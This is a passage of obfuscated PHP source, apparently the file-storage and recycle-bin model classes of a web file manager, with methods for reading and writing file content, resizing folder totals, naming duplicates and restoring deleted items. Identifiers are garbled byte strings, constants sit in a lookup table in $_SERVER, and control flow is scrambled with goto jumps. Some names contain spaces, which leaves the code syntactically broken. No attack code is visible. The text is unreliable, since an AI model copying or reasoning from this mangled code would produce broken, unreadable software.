str_replace($B­œ„ÒŸò˜[50], $B­œ„ÒŸò˜[33], Pinyin::encode($Bø‹•…‘èª)), $B­œ„ÒŸò˜[405] => Pinyin::encode($Bø‹•…‘èª, $B­œ„ÒŸò˜[406])); $this->metaSet($E–Í¾íÉœš, $B‡£Òø£‹ğ); } public function hasChildren($fµ¿­†èŒ•, $Eî¥ŸÎÊ¹Ğ = null) { $d†º«È®åÎ =& $_SERVER[İåâé¾]; $FÙ‰¨¤ê® = array($d†º«È®åÎ[384] => $fµ¿­†èŒ•); if (!is_null($Eî¥ŸÎÊ¹Ğ)) { $FÙ‰¨¤ê®[$d†º«È®åÎ[375]] = $Eî¥ŸÎÊ¹Ğ; } $b »Æ´ºÏ = $this->where($FÙ‰¨¤ê®)->limit(1); return $b »Æ´ºÏ ? !0 : !1; } public function getContent($EŞ÷„¦â¼Á) { goto dì«Œ‰¿¥Ÿ; d¶·†ÒÄƒ: return IO::getContent($eÑ¢ŠïòÆÀ[$Eğ•ñª¦œ”[76]]); goto cé—©›•­; A ‘ƒïõÉ : if ($eÑ¢ŠïòÆÀ[$Eğ•ñª¦œ”[78]] == 0) { return $Eğ•ñª¦œ”[33]; } $b­Éïì¡Æ = $Eğ•ñª¦œ”[1780] . $eÑ¢ŠïòÆÀ[$Eğ•ñª¦œ”[159]]; if ($eÑ¢ŠïòÆÀ[$Eğ•ñª¦œ”[78]] <= 1024 * 10) { $B‚Ø¿ßã³ = Cache::get($b­Éïì¡Æ); if (!$B‚Ø¿ßã³) { $B‚Ø¿ßã³ = IO::getContent($eÑ¢ŠïòÆÀ[$Eğ•ñª¦œ”[76]]); Cache::set($b­Éïì¡Æ, $B‚Ø¿ßã³); } return $B‚Ø¿ßã³; } goto d¶·†ÒÄƒ; dì«Œ‰¿¥Ÿ: $Eğ•ñª¦œ” =& $_SERVER[İåâé¾]; $eÑ¢ŠïòÆÀ = $this->fileInfoGet($EŞ÷„¦â¼Á); if (!$eÑ¢ŠïòÆÀ) { return !1; } goto A ‘ƒïõÉ ; cé—©›•­: } public function setDesc($DµõÛò‹êğ, $Cï‰§ÉŒùõ) { $Cğ‚§ñŒ“ =& $_SERVER[İåâé¾]; Model($Cğ‚§ñŒ“[381])->eventAddDesc($DµõÛò‹êğ, $Cï‰§ÉŒùõ); return $this->metaSet($DµõÛò‹êğ, $Cğ‚§ñŒ“[1586], $Cï‰§ÉŒùõ); } public function setContent($E×ñ¢ÂˆƒÁ, $B›çÂÄÆ¬¬ = '') { goto B‰‰É¡„ùø; D Á¯„˜äà: if (!$eíğÕÒ§Ä‚ || !$cš»˜ƒ¡Œ´) { return !1; } $this->checkLock($E×ñ¢ÂˆƒÁ); $FÀŞ—òîÛ§ = Model($C‚Ú÷öø„×[411])->addFileByContent($B›çÂÄÆ¬¬, $cš»˜ƒ¡Œ´[$C‚Ú÷öø„×[28]]); goto fŸê­…âŸÛ; BÙõÍ¾™©: return !0; goto F•›µÄÈÄæ; B‰‰É¡„ùø: $C‚Ú÷öø„× =& $_SERVER[İåâé¾]; $cš»˜ƒ¡Œ´ = $this->sourceInfo($E×ñ¢ÂˆƒÁ); $eíğÕÒ§Ä‚ = $this->fileInfoGet($E×ñ¢ÂˆƒÁ); goto D Á¯„˜äà; fŸê­…âŸÛ: $CÑƒÎ§á = $this->fileHistory($cš»˜ƒ¡Œ´, $FÀŞ—òîÛ§[$C‚Ú÷öø„×[382]], $FÀŞ—òîÛ§[$C‚Ú÷öø„×[78]]); if (!$CÑƒÎ§á) { return Model($C‚Ú÷öø„×[411])->remove($FÀŞ—òîÛ§[$C‚Ú÷öø„×[382]]); } $this->folderSizeReset($cš»˜ƒ¡Œ´[$C‚Ú÷öø„×[384]]); goto BÙõÍ¾™©; F•›µÄÈÄæ: } public function fileSubstr($f‚ø´÷¶¹, $E©˜²ˆŒ¼¾, $Fß‘½ÀÕÎ) { $A¤±¦âİ³§ = $this->fileInfoGet($f‚ø´÷¶¹); if (!$A¤±¦âİ³§) { return !1; } return IO::fileSubstr($A¤±¦âİ³§[$_SERVER[İåâé¾][76]], $E©˜²ˆŒ¼¾, $Fß‘½ÀÕÎ); } public function fileInfoGet($B‹·£à–ñ) { $AÀ™È‰–›ß =& $_SERVER[İåâé¾]; $B¥ÚíêØª‡ = $this->sourceInfo($B‹·£à–ñ); if (!$B¥ÚíêØª‡ || $B¥ÚíêØª‡[$AÀ™È‰–›ß[375]]) { return !1; } $DÆÉôšµ° = Model($AÀ™È‰–›ß[411])->fileInfo($B¥ÚíêØª‡[$AÀ™È‰–›ß[382]]); if ($DÆÉôšµ°) { $DÆÉôšµ°[$AÀ™È‰–›ß[28]] = $B¥ÚíêØª‡[$AÀ™È‰–›ß[28]]; } return $DÆÉôšµ°; } private function folderChildrenNumber($bÙº¸Í‡ùÈ) { $AÉËÑÛ«² =& $_SERVER[İåâé¾]; $fÀ­¤Ó½ìÀ = $this->sourceInfo($bÙº¸Í‡ùÈ); $E‡³¤é—‚‚ = array($AÉËÑÛ«²[399] => array($AÉËÑÛ«²[408], $fÀ­¤Ó½ìÀ[$AÉËÑÛ«²[373]] . $bÙº¸Í‡ùÈ . $AÉËÑÛ«²[409]), $AÉËÑÛ«²[400] => 0, $AÉËÑÛ«²[386] => 1); $dÉäĞö—§â = $this->where($E‡³¤é—‚‚)->count(); $C§Â­×ÏÀ• = $this->where($E‡³¤é—‚‚)->where(array($AÉËÑÛ«²[386] => 0))->count(); return array($AÉËÑÛ«²[82] => $C§Â­×ÏÀ•, $AÉËÑÛ«²[83] => $dÉäĞö—§â); } public static $cachePathInfo = array(); public function pathInfo($d„£äšĞ¢Ö, $bñŸ´——” = false) { goto AÒ´†‚œğ¯; F©†…Û•¨»: return $A¶¤ê¦ºò—; goto C¹»ò™¤ö­; AÒ´†‚œğ¯: $eË‰·¿ÛèÄ = _get(self::$cachePathInfoMore, $d„£äšĞ¢Ö); if ($eË‰·¿ÛèÄ) { return $eË‰·¿ÛèÄ; } $A¶¤ê¦ºò— = $this->sourceInfo($d„£äšĞ¢Ö); goto E«®âÃÊ™; E«®âÃÊ™: if (!$A¶¤ê¦ºò—) { return !1; } $A¶¤ê¦ºò— = $this->_listDataApplyItem($A¶¤ê¦ºò—, $bñŸ´——”); self::$cachePathInfo[$d„£äšĞ¢Ö] = $A¶¤ê¦ºò—; goto F©†…Û•¨»; C¹»ò™¤ö­: } public static $cachePathInfoMore = array(); public function pathInfoMore($BÊ³ÖÛŸê) { goto B¶Â¼¯ÊÂ; F‚˜®¤à¤´: $eÖ¶óª©Üø = $this->pathInfo($BÊ³ÖÛŸê); if (!$eÖ¶óª©Üø) { return !1; } if ($eÖ¶óª©Üø[$E¹„Äïï”»[375]] == $E¹„Äïï”»[376]) { $eÖ¶óª©Üø[$E¹„Äïï”»[81]] = $this->folderChildrenNumber($BÊ³ÖÛŸê); } else { $eÖ¶óª©Üø[$E¹„Äïï”»[158]] = $this->fileInfoGet($BÊ³ÖÛŸê); unset($eÖ¶óª©Üø[$E¹„Äïï”»[158]][$E¹„Äïï”»[76]]); } goto c­§ƒß¤Û; B¶Â¼¯ÊÂ: $E¹„Äïï”» =& $_SERVER[İåâé¾]; $DÅÏŒİ©²ì = _get(self::$cachePathInfoMore, $BÊ³ÖÛŸê); if ($DÅÏŒİ©²ì) { return $DÅÏŒİ©²ì; } goto F‚˜®¤à¤´; c­§ƒß¤Û: self::$cachePathInfoMore[$BÊ³ÖÛŸê] = $eÖ¶óª©Üø; return $eÖ¶óª©Üø; goto B‹Ø‚…Ñ; B‹Ø‚…Ñ: } public function sourceInfo($CÌ•Í—·¿Ú) { $cÜ´ˆ²¦êŠ =& $_SERVER[İåâé¾]; $FÈ©¸Õ‹î = $cÜ´ˆ²¦êŠ[1781] . $CÌ•Í—·¿Ú; $d¶Â¬»Æå› = _get(self::$cacheSourceInfo, $FÈ©¸Õ‹î); if ($d¶Â¬»Æå›) { return $d¶Â¬»Æå›; } self::$cacheSourceInfo[$FÈ©¸Õ‹î] = $this->where(array($cÜ´ˆ²¦êŠ[374] => $CÌ•Í—·¿Ú))->find(); return self::$cacheSourceInfo[$FÈ©¸Õ‹î]; } public function sourceCacheClear($eéæ‘©˜ê™ = false) { if ($eéæ‘©˜ê™ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[İåâé¾][1781] . $eéæ‘©˜ê™]); } public function pathInfoByPath($EÎÂÃÚîË’, $cµà‹ôÕ‰Ó) { $cÓÄ˜×Åâ² =& $_SERVER[İåâé¾]; $Bœ«ß”»ØÕ = !$cµà‹ôÕ‰Ó ? array() : explode($cÓÄ˜×Åâ²[8], trim($cµà‹ôÕ‰Ó, $cÓÄ˜×Åâ²[8])); $c×ÏÏ±×ÊÛ = $EÎÂÃÚîË’; foreach ($Bœ«ß”»ØÕ as $bƒàõ¯¢–§) { $Aò­±õ»ÏÎ = array($cÓÄ˜×Åâ²[384] => $c×ÏÏ±×ÊÛ, $cÓÄ˜×Åâ²[28] => $bƒàõ¯¢–§); $d¶Øå‹Û× = $this->where($Aò­±õ»ÏÎ)->select(); if (!$d¶Øå‹Û×) { return !1; } $d¶Øå‹Û× = array_sort_by($d¶Øå‹Û×, $cÓÄ˜×Åâ²[410]); $c×ÏÏ±×ÊÛ = $d¶Øå‹Û×[0][$cÓÄ˜×Åâ²[374]]; } return $this->pathInfo($c×ÏÏ±×ÊÛ, !0); } protected function updateModifyTime($E®Ö‡§Ù) { goto CÄç¬¡Ù©®; d†Øè™‹öÓ: $this->where($Eš¢®îá)->save($Fó¥ØÖÊœ); goto D»ìæŞÒ—÷; AÅçÌíêò: foreach ($E®Ö‡§Ù as $c»…¶Ó§¼Ç => $dÍ¤«š †Š) { $E®Ö‡§Ù[$c»…¶Ó§¼Ç] = intval($dÍ¤«š †Š); } $Eš¢®îá = array($dÁ£³ëŞå[374] => array($dÁ£³ëŞå[7], $E®Ö‡§Ù)); $Fó¥ØÖÊœ = array($dÁ£³ëŞå[397] => USER_ID, $dÁ£³ëŞå[1765] => time()); goto d†Øè™‹öÓ; CÄç¬¡Ù©®: $dÁ£³ëŞå =& $_SERVER[İåâé¾]; if (!$E®Ö‡§Ù) { return; } if (!is_array($E®Ö‡§Ù)) { $E®Ö‡§Ù = array($E®Ö‡§Ù); } goto AÅçÌíêò; D»ìæŞÒ—÷: } public function folderSizeReset($CèË•êø·å) { goto DšÜ·ïõÌ; F–’…¾“–: CacheLock::unlock($EôâêºÍ¡); goto A ƒßø£; DšÜ·ïõÌ: $BİóÄ‘©ŒŞ =& $_SERVER[İåâé¾]; if ($this->statusIgnoreResetSpace) { return; } $EôâêºÍ¡ = $BİóÄ‘©ŒŞ[1782] . $CèË•êø·å; goto bÁ¢Í×©…å; bÁ¢Í×©…å: CacheLock::lock($EôâêºÍ¡, 20); $this->sourceCacheClear($CèË•êø·å); $Dî–™Œ¶ = $this->sourceInfo($CèË•êø·å); goto E„Ï‘¯³¢è; bãÚ¤Î»£: $cÚ—Û‡ÈšÑ = $this->parentLevelArray($Dî–™Œ¶[$BİóÄ‘©ŒŞ[373]]); if ($cÚ—Û‡ÈšÑ) { $F ÈÈµÔ° = array($BİóÄ‘©ŒŞ[374] => array($BİóÄ‘©ŒŞ[1642], $cÚ—Û‡ÈšÑ)); $this->where($F ÈÈµÔ°)->setAdd($BİóÄ‘©ŒŞ[78], $E§çğí¥¤Û); } $this->targetSpaceUpdate($Dî–™Œ¶[$BİóÄ‘©ŒŞ[393]], $Dî–™Œ¶[$BİóÄ‘©ŒŞ[395]]); goto F–’…¾“–; E„Ï‘¯³¢è: $F ÈÈµÔ° = array($BİóÄ‘©ŒŞ[398] => $CèË•êø·å, $BİóÄ‘©ŒŞ[400] => 0); $Fë‰ôšÅä = $this->where($F ÈÈµÔ°)->sum($BİóÄ‘©ŒŞ[78]); $Fë‰ôšÅä = intval($Fë‰ôšÅä); goto Dš“¤Ùî‚¼; Dš“¤Ùî‚¼: $E§çğí¥¤Û = $Fë‰ôšÅä - intval($Dî–™Œ¶[$BİóÄ‘©ŒŞ[78]]); if ($E§çğí¥¤Û == 0) { return CacheLock::unlock($EôâêºÍ¡); } $this->where(array($BİóÄ‘©ŒŞ[415] => $CèË•êø·å))->setField($BİóÄ‘©ŒŞ[78], $Fë‰ôšÅä); goto bãÚ¤Î»£; A ƒßø£: } public function folderSizeResetChildren($c¿²²‡òŒÂ) { goto C  Ò„æøš; C  Ò„æøš: $F–ä™»´ =& $_SERVER[İåâé¾]; $this->sourceCacheClear($c¿²²‡òŒÂ); $BÆ²’Óùƒ = $this->sourceInfo($c¿²²‡òŒÂ); goto CêÄ±¤Û¨Ù; CêÄ±¤Û¨Ù: $A¿È—„™•é = array($F–ä™»´[386] => 1, $F–ä™»´[399] => array($F–ä™»´[408], $BÆ²’Óùƒ[$F–ä™»´[373]] . $c¿²²‡òŒÂ . $F–ä™»´[409])); $aô‘¾Ö‘Úì = $F–ä™»´[1783]; $CœÜÇ­’Ş = $this->field($aô‘¾Ö‘Úì)->where($A¿È—„™•é)->select(); goto D­‰¼è´…à; cî×‰è˜áé: foreach ($CœÜÇ­’Ş as $EÌÇ¥±–Ÿ•) { if ($EÌÇ¥±–Ÿ•[$F–ä™»´[78]] == $EÌÇ¥±–Ÿ•[$F–ä™»´[1784]]) { continue; } $EÎŞ“”œä[] = array($F–ä™»´[374], $EÌÇ¥±–Ÿ•[$F–ä™»´[374]], $F–ä™»´[78], $EÌÇ¥±–Ÿ•[$F–ä™»´[78]]); } $this->saveAll($EÎŞ“”œä); goto cÆ´ã²ä‡Í; D­‰¼è´…à: $A¿È—„™•é[$F–ä™»´[375]] = 0; $CŞ–š«ƒïë = $this->field($aô‘¾Ö‘Úì)->where($A¿È—„™•é)->select(); if (!$CŞ–š«ƒïë) { return; } goto FÙùë½É“Ñ; FÙùë½É“Ñ: $CœÜÇ­’Ş[] = $BÆ²’Óùƒ; $CœÜÇ­’Ş = array_to_keyvalue($CœÜÇ­’Ş, $F–ä™»´[374]); foreach ($CœÜÇ­’Ş as $càÑ®†›¸ => $EÌÇ¥±–Ÿ•) { $CœÜÇ­’Ş[$càÑ®†›¸][$F–ä™»´[1784]] = $CœÜÇ­’Ş[$càÑ®†›¸][$F–ä™»´[78]]; $CœÜÇ­’Ş[$càÑ®†›¸][$F–ä™»´[78]] = 0; } goto cæ˜ò½ø’; cæ˜ò½ø’: foreach ($CŞ–š«ƒïë as $EÌÇ¥±–Ÿ•) { $C³³ĞâÉÕ” = $EÌÇ¥±–Ÿ•[$F–ä™»´[384]] . $F–ä™»´[33]; if (!isset($CœÜÇ­’Ş[$C³³ĞâÉÕ”])) { continue; } if ($EÌÇ¥±–Ÿ•[$F–ä™»´[410]] == $CœÜÇ­’Ş[$C³³ĞâÉÕ”][$F–ä™»´[410]]) { $CœÜÇ­’Ş[$C³³ĞâÉÕ”][$F–ä™»´[78]] += $EÌÇ¥±–Ÿ•[$F–ä™»´[78]]; } } foreach ($CœÜÇ­’Ş as $EÌÇ¥±–Ÿ•) { $aŒ×°Õ¡ÔÚ = $this->parentLevelArray($EÌÇ¥±–Ÿ•[$F–ä™»´[373]]); foreach ($aŒ×°Õ¡ÔÚ as $C³³ĞâÉÕ”) { $C³³ĞâÉÕ” = $C³³ĞâÉÕ” . $F–ä™»´[33]; if (!isset($CœÜÇ­’Ş[$C³³ĞâÉÕ”])) { continue; } if ($EÌÇ¥±–Ÿ•[$F–ä™»´[410]] == $CœÜÇ­’Ş[$C³³ĞâÉÕ”][$F–ä™»´[410]]) { $CœÜÇ­’Ş[$C³³ĞâÉÕ”][$F–ä™»´[78]] += $EÌÇ¥±–Ÿ•[$F–ä™»´[78]]; } } } $EÎŞ“”œä = array(); goto cî×‰è˜áé; cÆ´ã²ä‡Í: } public function targetSpaceUpdate($bÊó¸õòÄ”, $A¾ºÁÄ¼ìĞ) { $B‚©”«Â•Ğ =& $_SERVER[İåâé¾]; if (!in_array($bÊó¸õòÄ”, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $aÄè„‘»© = $this->targetSpaceSize($bÊó¸õòÄ”, $A¾ºÁÄ¼ìĞ); if ($bÊó¸õòÄ” == self::TYPE_USER) { Model($B‚©”«Â•Ğ[1713])->userEdit($A¾ºÁÄ¼ìĞ, array($B‚©”«Â•Ğ[1528] => $aÄè„‘»©)); } else { if ($bÊó¸õòÄ” == self::TYPE_GROUP) { Model($B‚©”«Â•Ğ[1707])->groupEdit($A¾ºÁÄ¼ìĞ, array($B‚©”«Â•Ğ[1528] => $aÄè„‘»©)); } } } public function targetSpaceSize($BŞßğİŒ², $bç¾ŸñêœÛ) { goto A­›õ·Éæ²; A­›õ·Éæ²: $eåŠÂ¶¤¥œ =& $_SERVER[İåâé¾]; $f½öÓ‰â¾ = $this->sourceRoot($BŞßğİŒ², $bç¾ŸñêœÛ, !0); if (!$f½öÓ‰â¾) { return 0; } goto AÕ¯ÍÇˆ¥Ø; AÕ¯ÍÇˆ¥Ø: $dÅ÷…ÕÀ–“ = floatval($f½öÓ‰â¾[$eåŠÂ¶¤¥œ[78]]); $E¿É¯¿—ğŸ = array($eåŠÂ¶¤¥œ[399] => array($eåŠÂ¶¤¥œ[408], $eåŠÂ¶¤¥œ[1622] . $f½öÓ‰â¾[$eåŠÂ¶¤¥œ[374]] . $eåŠÂ¶¤¥œ[1738])); $eŒ±´ä¹¿’ = Model($eåŠÂ¶¤¥œ[1785])->field($eåŠÂ¶¤¥œ[415])->where($E¿É¯¿—ğŸ)->select(); goto Aó„‘öé; Aó„‘öé: $eŒ±´ä¹¿’ = array_to_keyvalue($eŒ±´ä¹¿’, $eåŠÂ¶¤¥œ[33], $eåŠÂ¶¤¥œ[374]); if ($eŒ±´ä¹¿’) { $E¿É¯¿—ğŸ = array($eåŠÂ¶¤¥œ[415] => array($eåŠÂ¶¤¥œ[1642], $eŒ±´ä¹¿’)); $dÅ÷…ÕÀ–“ += floatval($this->where($E¿É¯¿—ğŸ)->sum($eåŠÂ¶¤¥œ[78])); } return $dÅ÷…ÕÀ–“; goto b£…óå”; b£…óå”: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Eö¶µ®ë©) { return $this->fileTypeProfile($Eö¶µ®ë©, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eã²—¥ß©º) { return $this->fileTypeProfile($eã²—¥ß©º, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f«•ÒĞ‡ŸĞ, $D¯§‘µÓÓ) { goto Eë˜äø–ª§; AÆ“¼Œ±ßé: foreach ($Bñ Ø®¨Ü as $F¥­ÇĞ => $eÁè¥óî«‰) { $bÄ²È­ÂàÆ[$CŒøù¹®ãŠ[389]] = $this->fileTypeWhere($F¥­ÇĞ); $d¨İĞÀí…Ó[$F¥­ÇĞ] = array($CŒøù¹®ãŠ[1788] => $eÁè¥óî«‰[$CŒøù¹®ãŠ[28]], $CŒøù¹®ãŠ[1789] => $this->where($bÄ²È­ÂàÆ)->count(), $CŒøù¹®ãŠ[391] => $this->where($bÄ²È­ÂàÆ)->sum($CŒøù¹®ãŠ[78])); } Cache::set($a¢¾Àš¼ì, $d¨İĞÀí…Ó, 1200); return $d¨İĞÀí…Ó; goto A’°¿å©§İ; eõ‰ŸíÑöİ: if ($F±—ø—”‘) { return $F±—ø—”‘; } $bÄ²È­ÂàÆ = array($CŒøù¹®ãŠ[386] => 0); if ($f«•ÒĞ‡ŸĞ != !1) { $bÄ²È­ÂàÆ[$CŒøù¹®ãŠ[395]] = $f«•ÒĞ‡ŸĞ; $bÄ²È­ÂàÆ[$CŒøù¹®ãŠ[393]] = $D¯§‘µÓÓ; } goto EŒæ†¬¢¶Û; EŒæ†¬¢¶Û: $d¨İĞÀí…Ó = array(); $d¨İĞÀí…Ó[$CŒøù¹®ãŠ[1787]] = array($CŒøù¹®ãŠ[1788] => LNG($CŒøù¹®ãŠ[1787]), $CŒøù¹®ãŠ[1789] => $this->where($bÄ²È­ÂàÆ)->count(), $CŒøù¹®ãŠ[391] => $this->where($bÄ²È­ÂàÆ)->sum($CŒøù¹®ãŠ[78])); $Bñ Ø®¨Ü = KodIO::fileTypeList(); goto AÆ“¼Œ±ßé; Eë˜äø–ª§: $CŒøù¹®ãŠ =& $_SERVER[İåâé¾]; $a¢¾Àš¼ì = $CŒøù¹®ãŠ[1786] . $f«•ÒĞ‡ŸĞ . $CŒøù¹®ãŠ[71] . $D¯§‘µÓÓ; $F±—ø—”‘ = Cache::get($a¢¾Àš¼ì); goto eõ‰ŸíÑöİ; A’°¿å©§İ: } public function fileNameExist($dÇÙ¥á•²×, $bÍ¢Ò·”ˆ) { $aÀÑÀŸÓğå =& $_SERVER[İåâé¾]; $F âè†‰Ğ› = $this->childList($dÇÙ¥á•²×); foreach ($F âè†‰Ğ› as $BšŠİÜ¶‘Ò) { if ($BšŠİÜ¶‘Ò[$aÀÑÀŸÓğå[28]] == $bÍ¢Ò·”ˆ) { return $BšŠİÜ¶‘Ò[$aÀÑÀŸÓğå[374]]; } } return !1; } public function childList($f‹¬ŠÓ´È) { $dã«»°Ôªå =& $_SERVER[İåâé¾]; $aŸ‡‰Íê•­ = array($dã«»°Ôªå[384] => intval($f‹¬ŠÓ´È), $dã«»°Ôªå[410] => 0); $f†î¨ÖÔ÷õ = $this->cacheMemory()->where($aŸ‡‰Íê•­)->select(); $f†î¨ÖÔ÷õ = $f†î¨ÖÔ÷õ ? $f†î¨ÖÔ÷õ : array(); foreach ($f†î¨ÖÔ÷õ as $e¡—®‘“) { $c®‡¶¸ = $dã«»°Ôªå[1781] . $e¡—®‘“[$dã«»°Ôªå[374]]; self::$cacheSourceInfo[$c®‡¶¸] = $e¡—®‘“; } return $f†î¨ÖÔ÷õ; } public function fileNameAuto($aÅå…»­§ñ, $d ƒ´õ¯÷, $Aˆ‚‹Àˆ¿Ü = REPEAT_RENAME, $AŠ¬­†ïÅÁ = false) { $Cµáˆ¤¬Œó =& $_SERVER[İåâé¾]; $aêïáøğäÂ = $this->childList($aÅå…»­§ñ); $B»Ğç‡Œ„ = array_to_keyvalue($aêïáøğäÂ, $Cµáˆ¤¬Œó[33], $Cµáˆ¤¬Œó[28]); return $this->fileNameAutoGet($B»Ğç‡Œ„, $d ƒ´õ¯÷, $Aˆ‚‹Àˆ¿Ü, $AŠ¬­†ïÅÁ); } public function fileNameAutoGet($F¹Îôß©¤, $døä‘ˆ‚ÁÖ, $Cè×¡Ö¹‹‘, $eˆ™™»£Ê ) { $a¹íï¶Œ¥‡ =& $_SERVER[İåâé¾]; if ($Cè×¡Ö¹‹‘ == REPEAT_REPLACE || !$F¹Îôß©¤ || !in_array_not_case($døä‘ˆ‚ÁÖ, $F¹Îôß©¤) || $eˆ™™»£Ê  && $Cè×¡Ö¹‹‘ != REPEAT_RENAME_FOLDER) { return $døä‘ˆ‚ÁÖ; } if ($Cè×¡Ö¹‹‘ == REPEAT_SKIP) { return !1; } $d¶ÍÒ–ÅçÙ = $a¹íï¶Œ¥‡[90] . get_path_ext($døä‘ˆ‚ÁÖ); $d¶ÍÒ–ÅçÙ = $d¶ÍÒ–ÅçÙ == $a¹íï¶Œ¥‡[90] || $eˆ™™»£Ê  ? $a¹íï¶Œ¥‡[33] : $d¶ÍÒ–ÅçÙ; for ($eöƒßâ«£× = 1; $eöƒßâ«£× <= count($F¹Îôß©¤) + 1; $eöƒßâ«£×++) { $CÚ–ÃîÇ = substr($døä‘ˆ‚ÁÖ, 0, strlen($døä‘ˆ‚ÁÖ) - strlen($d¶ÍÒ–ÅçÙ)); $EÆ¦ñ±£²æ = $CÚ–ÃîÇ . "\50{$eöƒßâ«£×}\51{$d¶ÍÒ–ÅçÙ}"; if (!in_array_not_case($EÆ¦ñ±£²æ, $F¹Îôß©¤)) { return $EÆ¦ñ±£²æ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\162\x63\145\137\162\145\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\124\151\x6d\145", "\164\151\155\145", "\151\x6e\163\145\162\164", "\x66\165\x6e\x63\164\151\157\156")); public function listData($bĞàõ¼“ªó = false) { $EÀ¿¡ïƒ¸Û =& $_SERVER[İåâé¾]; $bĞàõ¼“ªó = $bĞàõ¼“ªó ? $bĞàõ¼“ªó : USER_ID; $f„’„Å¬ôŞ = $this->where(array($EÀ¿¡ïƒ¸Û[1077] => $bĞàõ¼“ªó))->select(); return array_to_keyvalue($f„’„Å¬ôŞ, $EÀ¿¡ïƒ¸Û[33], $EÀ¿¡ïƒ¸Û[374]); } public function moveToRecycle($fÂ°µÙË) { goto D„êŠ‚ÏŠĞ; d®Ã£—‚‘ˆ: $this->recycleMove($fÂ°µÙË, 1); if ($cñò½Ã©×ğ[$A”Ü„Ü»Ô[375]] == $A”Ü„Ü»Ô[376]) { $D³İª†—Î = array($A”Ü„Ü»Ô[399] => array($A”Ü„Ü»Ô[408], $cñò½Ã©×ğ[$A”Ü„Ü»Ô[373]] . $fÂ°µÙË . $A”Ü„Ü»Ô[409])); $Bé˜ãŠÜÄ->where($D³İª†—Î)->setField($A”Ü„Ü»Ô[410], 1); } goto b—ù‰ÍÎ‰; D„êŠ‚ÏŠĞ: $A”Ü„Ü»Ô =& $_SERVER[İåâé¾]; $Bé˜ãŠÜÄ = Model($A”Ü„Ü»Ô[850]); $cñò½Ã©×ğ = $Bé˜ãŠÜÄ->sourceInfo($fÂ°µÙË); goto fÀÅéçÃ‰; fÀÅéçÃ‰: if (!$cñò½Ã©×ğ || $cñò½Ã©×ğ[$A”Ü„Ü»Ô[410]] == $A”Ü„Ü»Ô[376]) { return; } $e·óùåÓÒ© = array($A”Ü„Ü»Ô[415] => $fÂ°µÙË, $A”Ü„Ü»Ô[1077] => USER_ID, $A”Ü„Ü»Ô[392] => $cñò½Ã©×ğ[$A”Ü„Ü»Ô[393]], $A”Ü„Ü»Ô[394] => $cñò½Ã©×ğ[$A”Ü„Ü»Ô[395]], $A”Ü„Ü»Ô[399] => $cñò½Ã©×ğ[$A”Ü„Ü»Ô[373]]); $this->add($e·óùåÓÒ©); goto d®Ã£—‚‘ˆ; b—ù‰ÍÎ‰: } public function clear() { $this->remove(!1); } public function remove($fÒ£ÓÎƒˆ = false) { goto bÄä½©¶‘Ü; bÄä½©¶‘Ü: $b‰Šß‚áÌÃ =& $_SERVER[İåâé¾]; $bğ¾¬å Ï‚ = Model($b‰Šß‚áÌÃ[850]); $E‰‡ï„Şë¥ = $this->listData(); goto D—÷•ùì; D—÷•ùì: $fÒ£ÓÎƒˆ = $fÒ£ÓÎƒˆ === !1 ? !1 : $fÒ£ÓÎƒˆ; $e¶¬îà¼Ìµ = array(); foreach ($E‰‡ï„Şë¥ as $B¦œÏ±î‚·) { if ($fÒ£ÓÎƒˆ != !1 && !in_array($B¦œÏ±î‚·, $fÒ£ÓÎƒˆ)) { continue; } $cƒ˜·ÒÆ†™ = $this->where(array($b‰Šß‚áÌÃ[374] => $B¦œÏ±î‚·))->find(); $d‹İÃ·Ô†Ë = $cƒ˜·ÒÆ†™[$b‰Šß‚áÌÃ[393]] . $b‰Šß‚áÌÃ[71] . $cƒ˜·ÒÆ†™[$b‰Šß‚áÌÃ[395]]; $e¶¬îà¼Ìµ[$d‹İÃ·Ô†Ë] = array($b‰Šß‚áÌÃ[392] => $cƒ˜·ÒÆ†™[$b‰Šß‚áÌÃ[393]], $b‰Šß‚áÌÃ[395] => $cƒ˜·ÒÆ†™[$b‰Šß‚áÌÃ[395]]); $this->where(array($b‰Šß‚áÌÃ[374] => $B¦œÏ±î‚·))->delete(); $bğ¾¬å Ï‚->remove($B¦œÏ±î‚·, !1); } goto B¼çˆéóÇ; B¼çˆéóÇ: foreach ($e¶¬îà¼Ìµ as $C‰ê¹¥ÄÈ¡) { $bğ¾¬å Ï‚->targetSpaceUpdate($C‰ê¹¥ÄÈ¡[$b‰Šß‚áÌÃ[393]], $C‰ê¹¥ÄÈ¡[$b‰Šß‚áÌÃ[395]]); } goto C¨ä¬›ì·Ö; C¨ä¬›ì·Ö: } public function restore($cÊºÔ©‹¡ = false) { goto bÁÏˆÒÛØ§; CÍ’¾Ç£æ: foreach ($a‹Ìƒ¾‚é as $dÑÙ˜‹‰çĞ) { goto dä­­…àí¢; f¤ØÓè››‡: if ($a ®¯ÙëÛ[$CìñƒÈ°»÷[375]] == $CìñƒÈ°»÷[376]) { $c¨Ÿëä¿öÀ[] = $dÑÙ˜‹‰çĞ; } goto aÂÄÂ¿öÃ¯; A™ÇÑƒÙñó: $this->where(array($CìñƒÈ°»÷[374] => $dÑÙ˜‹‰çĞ))->delete(); $B˜ĞÎÌøåÔ->folderSizeReset($a ®¯ÙëÛ[$CìñƒÈ°»÷[384]]); $c¨Ÿëä¿öÀ[] = $a ®¯ÙëÛ[$CìñƒÈ°»÷[384]]; goto f¤ØÓè››‡; dä­­…àí¢: if ($cÊºÔ©‹¡ != !1 && !in_array($dÑÙ˜‹‰çĞ, $cÊºÔ©‹¡)) { continue; } $a ®¯ÙëÛ = $B˜ĞÎÌøåÔ->where(array($CìñƒÈ°»÷[374] => $dÑÙ˜‹‰çĞ))->find(); $CƒÊ£¸°‚” = $B˜ĞÎÌøåÔ->where(array($CìñƒÈ°»÷[374] => $a ®¯ÙëÛ[$CìñƒÈ°»÷[384]]))->find(); goto BåÇßÁšå; BåÇßÁšå: if ($CƒÊ£¸°‚”[$CìñƒÈ°»÷[410]] == $CìñƒÈ°»÷[376]) { continue; } $this->recycleMove($dÑÙ˜‹‰çĞ, 0); if ($a 